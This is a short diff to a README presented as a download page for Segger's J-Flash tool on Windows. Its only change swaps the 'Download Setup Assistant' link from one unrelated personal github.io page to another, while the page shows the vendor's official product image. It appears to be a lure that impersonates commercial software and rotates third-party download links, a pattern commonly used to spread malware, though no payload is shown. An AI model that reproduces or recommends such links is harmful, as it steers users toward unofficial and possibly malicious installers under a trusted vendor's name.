@@ -1,7 +1,7 @@
 
 <h1 align="center">⚙️ JFlash Segger (Windows)</h1>
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://abubakrhohlov.github.io/.github/jflash-segger-tool)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://azrieldanielsjaca.github.io/.github/jflash-segger-tool)
 
 <p align="center">
   <img src="https://www.segger.com/fileadmin/images/products/J-Link/Software/JFlash.png" alt="JFlash Segger Interface Preview" width="700" />
